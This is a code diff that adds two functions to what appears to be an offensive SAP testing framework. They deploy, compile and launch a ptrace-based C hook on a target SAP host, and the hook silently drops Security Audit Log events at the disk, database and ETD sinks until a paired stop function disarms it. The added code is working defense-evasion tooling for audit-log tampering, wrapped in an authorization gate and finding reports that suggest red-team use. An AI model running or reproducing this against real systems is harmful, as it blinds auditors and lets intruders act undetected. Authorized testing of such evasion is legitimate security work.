@@ -1447,3 +1447,183 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
         tabname_filter=tabs,
         hold_seconds=hold_seconds,
         via=via)
+
+
+# ---------------------------------------------------------------------------
+# 4.A.6 — Virtual SAP Death Star (in-memory SAL suppression)
+# ---------------------------------------------------------------------------
+
+def tier3_sal_death_star_launch(state, node,
+                                  filter_classes: str = "",
+                                  target_pid=None,
+                                  skip_upload: bool = False,
+                                  skip_compile: bool = False,
+                                  verbose: bool = False) -> dict:
+    """Deploy + launch Julian Petersohn's ``sap_audit_hook`` on ``node``.
+
+    Uploads the vendored C source, compiles it as ``<sid>adm`` on the
+    target, finds a disp+work worker PID, and launches the hook in
+    ``--suppress`` mode.  From that point on every SAL event matching
+    ``filter_classes`` (empty = all classes) is silently dropped across
+    the three audit sinks (disk fwrite, DB write_event_to_DB, ETD
+    SendEvent) until ``tier3_sal_death_star_stop`` is called.
+
+    The technique persists as a background process on the target — no
+    ``evasion_window`` context wraps it.  Cleanup is the operator's
+    responsibility via the paired ``_stop`` entry point (or Cleanup All
+    Users, which also runs the hook stop).
+
+    Args:
+      filter_classes:   Comma-separated SAL event-class list (``AUW``,
+                        ``AUW,AU3``, etc.).  Empty → suppress everything
+                        the hook sees.
+      target_pid:       Force a specific ``disp+work`` PID.  ``None`` →
+                        auto-pick the first ``_W<n>`` worker.
+      skip_upload:      Reuse ``/tmp/sap_audit_hook.c`` if present.
+      skip_compile:     Reuse ``/tmp/sap_audit_hook`` if present.
+      verbose:          Pass ``-v`` to the hook (log-file diagnostics).
+
+    Returns a dict carrying the hook PID, worker PID, install paths, and
+    filter — the caller (GUI, script) should stash this on the state so
+    a paired ``stop`` can find the pidfile.
+    """
+    technique = "sal_death_star"
+    try:
+        # No baseline requirement — the C hook restores its own INT3
+        # bytes on SIGTERM detach; there is no persistent target state
+        # for us to snapshot up-front.
+        assert_evasion_allowed(state, node, technique,
+                                require_baseline=False)
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e),
+                             hook_pid=None)
+
+    # OS type gate.  The C source uses Linux-specific APIs
+    # (process_vm_readv, PTRACE_ATTACH semantics, /proc/<pid>/exe) so
+    # Windows targets fall out immediately with a clear reason.
+    os_type = (getattr(node, "os_type", "") or "").lower()
+    if os_type and os_type not in ("linux", "linux/unix", "unix", "aix"):
+        return _wrap_result(
+            technique, False,
+            error=(f"unsupported OS {os_type!r}: sap_audit_hook uses "
+                    "Linux ptrace/procfs APIs — Windows and macOS SAP "
+                    "kernels are not supported"),
+            hook_pid=None)
+
+    sid = getattr(node, "sid", "?")
+    try:
+        from sapmap_death_star import (deploy_and_launch, DeathStarError)
+    except Exception as e:
+        return _wrap_result(technique, False,
+                             error=f"death-star module unavailable: {e}",
+                             hook_pid=None)
+
+    print(f"[*] {sid}: Tier 3 sal_death_star — deploying "
+           f"in-memory SAL suppressor "
+           f"(filter={filter_classes or '(all)'})")
+    try:
+        result = deploy_and_launch(
+            node,
+            filter_classes=filter_classes,
+            target_pid=target_pid,
+            skip_upload=skip_upload,
+            skip_compile=skip_compile,
+            verbose=verbose,
+        )
+    except DeathStarError as e:
+        print(f"[-] {sid}: sal_death_star failed: {e}")
+        return _wrap_result(technique, False, error=str(e),
+                             hook_pid=None)
+    except Exception as e:
+        logger.exception("sal_death_star unexpected error")
+        return _wrap_result(technique, False,
+                             error=f"unexpected error: {e}",
+                             hook_pid=None)
+
+    # Stash on the node so paired ``stop`` can find it without the
+    # operator having to re-type paths.  Cleared by ``_stop``.
+    node._death_star_state = {
+        "hook_pid": result["hook_pid"],
+        "target_pid": result["target_pid"],
+        "target_comm": result["target_comm"],
+        "binary_path": result["binary_path"],
+        "pidfile_path": result["pidfile_path"],
+        "log_path": result["log_path"],
+        "filter_classes": result["filter_classes"],
+    }
+
+    try:
+        from sapmap_findings import emit_finding
+        emit_finding(
+            "CRITICAL", sid,
+            f"Tier 3: Virtual SAP Death Star armed on {sid} — SAL "
+            f"events matching {result['filter_classes'] or '(all)'} "
+            f"are silently dropped at fwrite/write_event_to_DB/ETD in "
+            f"work-process PID {result['target_pid']}.  Hook PID "
+            f"{result['hook_pid']} on the target; stop with the "
+            f"paired Disarm action or SIGTERM to restore INT3 bytes.")
+    except Exception:
+        pass
+
+    return _wrap_result(
+        technique, True,
+        hook_pid=result["hook_pid"],
+        target_pid=result["target_pid"],
+        target_comm=result["target_comm"],
+        binary_path=result["binary_path"],
+        pidfile_path=result["pidfile_path"],
+        log_path=result["log_path"],
+        filter_classes=result["filter_classes"],
+    )
+
+
+def tier3_sal_death_star_stop(state, node) -> dict:
+    """SIGTERM the death-star hook.  The hook's SIGTERM handler calls
+    ``detach_all()`` which restores every INT3 byte and releases ptrace
+    on each attached ``disp+work`` worker — a clean disarm.
+
+    Idempotent: safe to call even when no hook is running; returns
+    ``ok=False`` with a "nothing to stop" message in that case rather
+    than raising.
+    """
+    technique = "sal_death_star"
+    try:
+        assert_evasion_allowed(state, node, technique,
+                                require_baseline=False)
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e))
+
+    sid = getattr(node, "sid", "?")
+    stash = getattr(node, "_death_star_state", None) or {}
+
+    try:
+        from sapmap_death_star import stop
+    except Exception as e:
+        return _wrap_result(technique, False,
+                             error=f"death-star module unavailable: {e}")
+
+    print(f"[*] {sid}: Tier 3 sal_death_star — disarming "
+           f"(SIGTERM → detach_all → INT3 restore)")
+    r = stop(node,
+              pidfile_path=stash.get("pidfile_path"),
+              binary_path=stash.get("binary_path"))
+
+    # Clear the stash on success so a subsequent launch starts clean.
+    if r.get("ok"):
+        try:
+            delattr(node, "_death_star_state")
+        except AttributeError:
+            pass
+        try:
+            from sapmap_findings import emit_finding
+            emit_finding(
+                "INFO", sid,
+                f"Tier 3: Virtual SAP Death Star disarmed on {sid} — "
+                f"hook PID {r.get('pid')} SIGTERM'd, INT3 bytes "
+                f"restored, ptrace detached.")
+        except Exception:
+            pass
+
+    return _wrap_result(technique, r.get("ok", False),
+                         message=r.get("message", ""),
+                         hook_pid=r.get("pid"))
